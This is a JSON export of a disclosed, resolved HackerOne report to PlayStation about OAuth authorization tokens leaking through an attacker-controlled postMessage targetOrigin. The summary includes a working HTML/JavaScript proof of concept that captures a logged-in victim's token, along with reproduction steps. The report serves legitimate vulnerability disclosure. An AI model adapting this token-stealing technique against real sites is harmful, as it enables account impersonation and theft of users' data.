{"id":826394,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjYzOTQ=","url":"https://hackerone.com/reports/826394","title":"Authorization Token on PlayStation Network Leaks via postMessage function","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-03-22T13:27:53.983Z","submitted_at":"2020-03-22T13:27:53.983Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nnez","url":"/nnez","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":44879,"url":"https://hackerone.com/playstation","handle":"playstation","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PlayStation","twitter_handle":"PlayStation","website":"https://www.playstation.com","about":"Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-21T00:35:14.023Z","bug_reporter_agreed_on_going_public_at":"2020-08-13T05:53:56.090Z","team_member_agreed_on_going_public_at":"2020-11-21T00:35:13.905Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":46,"voters":["mashoud1122","kapkan","mainteemoforfun","zayn1337","bhavi","naategh","f_m","haqsek2","h4x0r-dz","t3chn0phil3","and 36 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":40731,"asset_type":"URL","asset_identifier":"my.playstation.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7390851,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-22T13:33:41.736Z","updated_at":"2020-03-22T13:33:41.736Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7391162,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-22T14:49:35.794Z","updated_at":"2020-03-22T14:49:35.794Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7398594,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-23T12:11:19.967Z","updated_at":"2020-03-23T12:11:19.967Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7398688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-23T12:22:58.337Z","updated_at":"2020-03-23T12:22:58.337Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7403779,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-23T19:18:18.088Z","updated_at":"2020-03-23T19:18:18.088Z","actor":{"username":"sdredneck","cleared":false,"url":"/sdredneck","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7407973,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-24T09:36:12.312Z","updated_at":"2020-03-24T09:36:12.312Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7474617,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-30T01:31:45.964Z","updated_at":"2020-03-30T01:31:45.964Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7481474,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-30T13:44:05.945Z","updated_at":"2020-03-30T13:44:05.945Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7481490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-30T13:45:58.145Z","updated_at":"2020-03-30T13:45:58.145Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7488150,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T01:49:51.883Z","updated_at":"2020-03-31T01:49:51.883Z","actor":{"url":"/playstation","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PlayStation"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"playstation","collaborator":{"username":"nnez","url":"/nnez"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7488164,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T01:54:36.293Z","updated_at":"2020-03-31T01:54:36.293Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7695508,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-17T11:21:54.957Z","updated_at":"2020-04-17T11:21:54.957Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7802892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T04:47:46.126Z","updated_at":"2020-04-27T04:47:46.126Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7809485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T13:54:51.206Z","updated_at":"2020-04-27T13:54:51.206Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7809901,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T14:18:56.376Z","updated_at":"2020-04-27T14:18:56.376Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7951779,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-10T14:46:13.162Z","updated_at":"2020-05-10T14:46:13.162Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7962152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T12:40:10.192Z","updated_at":"2020-05-11T12:40:10.192Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8354883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-20T11:09:35.061Z","updated_at":"2020-06-20T11:09:35.061Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8377337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-22T20:26:05.837Z","updated_at":"2020-06-22T20:26:05.837Z","actor":{"username":"shoshin_cup","cleared":false,"url":"/shoshin_cup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/541/482/8f92ed5cbd717ef451a19e817cb5e058a7ad3127_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8381115,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-23T05:29:20.814Z","updated_at":"2020-06-23T05:29:20.814Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8917414,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-12T15:32:21.260Z","updated_at":"2020-08-12T15:32:21.260Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8919695,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-12T20:01:00.372Z","updated_at":"2020-08-12T20:01:00.372Z","actor":{"username":"shoshin_cup","cleared":false,"url":"/shoshin_cup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/541/482/8f92ed5cbd717ef451a19e817cb5e058a7ad3127_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8919700,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-12T20:01:45.483Z","updated_at":"2020-08-12T20:01:45.483Z","actor":{"username":"shoshin_cup","cleared":false,"url":"/shoshin_cup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/541/482/8f92ed5cbd717ef451a19e817cb5e058a7ad3127_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"nnez","url":"/nnez"},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8922278,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T05:53:27.044Z","updated_at":"2020-08-13T05:53:27.044Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8922282,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T05:53:56.122Z","updated_at":"2020-08-13T05:53:56.122Z","first_to_agree":true,"actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-19T17:20:52.306Z","updated_at":"2020-08-19T17:24:59.204Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8981106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-19T17:24:59.528Z","updated_at":"2020-08-19T17:24:59.528Z","actor":{"username":"nnez","cleared":false,"url":"/nnez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/MVX3y1YcaXbEV1w4aD6L5qKP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9525228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-14T20:05:57.689Z","updated_at":"2020-10-14T20:05:57.689Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9883836,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-21T00:35:13.926Z","updated_at":"2020-11-21T00:35:13.926Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9883837,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-21T00:35:14.048Z","updated_at":"2020-11-21T00:35:14.048Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":25533,"category":"team","content":"# Description\nAfter some analysis on how playstation network authentication work, I came across a certain pattern of how authorization tokens are handled.\nThe web application utilizes postMessage function to exchange authorization tokens between windows/frames.\n\nTo simplify this, let's follow on one of authorization flows.\nWhen you enter, https://my.playstation.com\nThere is a request to\n\nhttps://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com\u0026prompt=none\n\nto get an authorization token for corresponding scopes in the above URL. If user is already authenticated and has permission for all of the scopes, the redirection will be made to redirect_uri which is https://my.playstation.com/auth/response.html?requestID=iframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2\u0026baseUrl=/\u0026targetOrigin=https://my.playstation.com\u0026prompt=none\n\nThe request is made using an iframe and the token will be sent back via postMessage and the problem lies on how this authorization token is sent.\nConsider the javascript function (view source on above URL) responsible for sending token back.\n\n````\nfunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \"\",\n        e = a.returnRoute || \"\",\n        f = a.excludeQueryParams,\n        g = !f \u0026\u0026 window.location.search || \"\";\n    switch (b) {\n        case \"iframe\":\n            window.parent.postMessage(a, c);\n            break;\n        case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n        case \"external\":\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ? window.location.href =\n                h : window.location.href = \"https://playstation.com/error\"\n    }\n}\n```\n\nIf the requestID starts with window, the token will be sent back to window.opener instead of window.parent and targetOrigin is controlled by user via GET parameter with the same name.\n\nTherefore, if the authorization endpoint is opened from a malicious page via window.open and target origin is set to * (wildcard), the token will be sent back to malicious page.\n\nHere is a PoC code I wrote to demonstrate this\n\n```\n\u003c!Doctype HTML\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003ctitle\u003ePlayStation Authorization Token Leaks via postMessage\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript type=\"text/javascript\"\u003e\n        window.addEventListener(\"load\", () =\u003e {\n            document.getElementById(\"startBtn\").addEventListener(\"click\", () =\u003e {\n                var x = window.open('https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dwindow_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3D*\u0026prompt=none', 'mywindow');\n                window.onmessage = (e) =\u003e {\n                    document.getElementById(\"token-plate\").innerText = JSON.stringify(e.data);\n                }\n            });\n        });\n        \u003c/script\u003e\n        \u003ch1\u003ePlayStation Authorization Token Leaks via postMessage\u003c/h1\u003e\n        \u003cbutton id=\"startBtn\" style='padding: 0.5em; font-size: 1.2em; width: 200px;'\u003eStart\u003c/button\u003e\n        \u003cdiv id=\"token-plate\" style=\"margin: 1em; padding: 1.2em; border: 1px solid #ddd;\"\u003e\n            \u003cem\u003eToken Plate\u003c/em\u003e\n        \u003c/div\u003e\n        \u003cfooter\u003e\n            @nnez | HackerOne\n        \u003c/footer\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\n# Steps to Reproduce\nLogin on playstation network, maybe at https://my.playstation.com or https://store.playstation.com\nGo to malicious page with provided code, or you can go to this PoC I hosted, http://nnez-poc.000webhostapp.com/e1f47833ad18d94a20780d81f8060c79.html\nClick on start button, after the window is opened, navigate back and you will see access token in the box.\n\n# Additional Notes\nThis also happened on other endpoints with the same code base such as\n\nhttps://social.playstation.com/starblaster2/pdc/master/auth/response-6bd54237a5ffea223e2784fcd88c34e1.html?requestID=iframe_request_f179f207-79d8-4659-b1d4-f85e6c57a212\u0026baseUrl=/starblaster2/pdc/master/\u0026targetOrigin=https://store.playstation.com\n\nbut with different range of permission scopes.\n\n\n# Impact\nAn authorization token on my.playstation.com would allow an attacker to impersonate as a victim, access to sensitive information, post on victim news feed\nAn authorization token on social.playstation.com would allow an attacker to impersonate as a victim, access to friends list and chat with victim's friends.","can_view?":true,"can_edit?":false,"content_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eAfter some analysis on how playstation network authentication work, I came across a certain pattern of how authorization tokens are handled.\u003cbr\u003e\nThe web application utilizes postMessage function to exchange authorization tokens between windows/frames.\u003c/p\u003e\n\n\u003cp\u003eTo simplify this, let\u0026#39;s follow on one of authorization flows.\u003cbr\u003e\nWhen you enter, \u003ca title=\"https://my.playstation.com\" href=\"/redirect?url=https%3A%2F%2Fmy.playstation.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://my.playstation.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThere is a request to\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026amp;scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026amp;redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com\u0026amp;prompt=none\" 